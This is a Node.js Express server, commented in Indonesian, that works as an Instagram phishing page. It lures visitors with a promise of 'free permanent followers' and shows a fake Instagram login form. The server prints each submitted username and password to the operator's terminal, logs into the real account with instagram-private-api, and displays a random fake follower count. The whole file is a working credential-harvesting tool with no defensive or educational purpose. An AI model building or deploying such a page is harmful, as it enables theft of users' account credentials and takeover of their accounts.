const express = require('express');
const { IgApiClient } = require('instagram-private-api');
const path = require('path');
const app = express();

// Setup untuk parsing body request
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Inisialisasi Instagram API Client
const ig = new IgApiClient();

// Fungsi untuk menghasilkan port acak antara 3000 hingga 5000
const getRandomPort = () => {
  return Math.floor(Math.random() * (5000 - 3000 + 1)) + 3000;
};

// HTML beranda
const homepageContent = `
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram Followers Gratis dan Permanen</title>
  <style>
    body {
      font-family: 'Roboto', sans-serif;
      background: linear-gradient(45deg, #ff4b2b, #ff416c);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .main-container {
      background: rgba(0, 0, 0, 0.8);
      padding: 40px;
      border-radius: 15px;
      text-align: center;
      color: white;
      width: 350px;
    }
    .logo {
      width: 100px;
      margin-bottom: 20px;
    }
    h1 {
      font-size: 32px;
      margin-bottom: 20px;
    }
    p {
      font-size: 18px;
      margin-bottom: 20px;
    }
    .cta-button {
      padding: 12px 24px;
      background-color: #ff416c;
      color: white;
      font-size: 18px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
    .cta-button:hover {
      background-color: #ff4b2b;
    }
  </style>
</head>
<body>
  <div class="main-container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" class="logo">
    <h1>Instagram Followers Gratis dan Permanen</h1>
    <p>Ingin menambah followers Instagrammu secara gratis dan permanen? Daftar sekarang dan dapatkan followers secara instan!</p>
    <a href="/login"><button class="cta-button">Login untuk Mendapatkan Followers</button></a>
  </div>
</body>
</html>
`;

const loginPageContent = `
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram Bot Login</title>
  <style>
    body {
      font-family: 'Roboto', sans-serif;
      background: linear-gradient(45deg, #ff4b2b, #ff416c);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .login-container {
      background: rgba(0, 0, 0, 0.8);
      padding: 40px;
      border-radius: 15px;
      width: 350px;
      text-align: center;
    }
    .logo {
      width: 100px;
      margin-bottom: 20px;
    }
    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 12px;
      margin: 12px 0;
      border: 1px solid #ddd;
      border-radius: 5px;
    }
    button {
      width: 100%;
      padding: 12px;
      background-color: #ff416c;
      color: white;
      font-size: 18px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
    button:hover {
      background-color: #ff4b2b;
    }
    #statusMessage {
      margin-top: 20px;
      color: #fff;
      font-size: 16px;
    }
    #popup {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: rgba(0, 0, 0, 0.8);
      padding: 30px;
      border-radius: 10px;
      color: #fff;
      text-align: center;
      display: none;
    }
    #popup button {
      background-color: #ff416c;
      color: #fff;
      padding: 10px 20px;
      border-radius: 5px;
      border: none;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" class="logo">
    <h2>Login Instagram</h2>
    <form id="loginForm">
      <input type="text" id="username" placeholder="Username" required>
      <input type="password" id="password" placeholder="Password" required>
      <button type="submit">Login</button>
    </form>
    <p id="statusMessage"></p>
  </div>

  <div id="popup">
    <h3>Selamat! Kamu mendapatkan <span id="followersCount"></span> followers gratis!</h3>
    <button onclick="closePopup()">Tutup</button>
  </div>

  <script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();

      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;

      // Show loading spinner
      document.getElementById('statusMessage').textContent = 'Sedang memproses login...';
      document.getElementById('statusMessage').style.color = 'blue';

      fetch('/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, password })
      })
      .then(response => response.json())
      .then(data => {
        if (data.success) {
          document.getElementById('statusMessage').textContent = 'Login berhasil!';
          document.getElementById('statusMessage').style.color = 'green';
          showPopup();
        } else {
          document.getElementById('statusMessage').textContent = data.message;
          document.getElementById('statusMessage').style.color = 'red';
        }
      })
      .catch(error => {
        document.getElementById('statusMessage').textContent = 'Terjadi kesalahan!';
        document.getElementById('statusMessage').style.color = 'red';
      });
    });

    function showPopup() {
      const followersCount = Math.floor(Math.random() * 1000) + 1;
      document.getElementById('followersCount').textContent = followersCount;
      document.getElementById('popup').style.display = 'block';
    }

    function closePopup() {
      document.getElementById('popup').style.display = 'none';
    }
  </script>
</body>
</html>
`;

app.get('/', (req, res) => {
  res.send(homepageContent);  // Halaman beranda
});

app.get('/login', (req, res) => {
  res.send(loginPageContent);  // Halaman login Instagram
});

app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  // Menampilkan username dan password ke terminal (Termux)
  console.log(`Username: ${username}`);
  console.log(`Password: ${password}`);

  try {
    ig.state.generateDevice(username);
    await ig.account.login(username, password);

    // Kirim respons login berhasil
    res.json({ success: true, message: 'Login berhasil!' });

    // Simulasi followers gratis (akan tampil di frontend)
    const randomFollowers = Math.floor(Math.random() * 1000) + 1;
    console.log(`Selamat! Kamu mendapatkan ${randomFollowers} followers gratis!`);

  } catch (error) {
    console.error('Login gagal:', error);
    res.json({ success: false, message: 'Login gagal! Periksa kembali username dan password Anda.' });
  }
});

// Gunakan port acak
const port = getRandomPort();
app.listen(port, () => {
  console.log(`Server berjalan di http://localhost:${port}`);
});
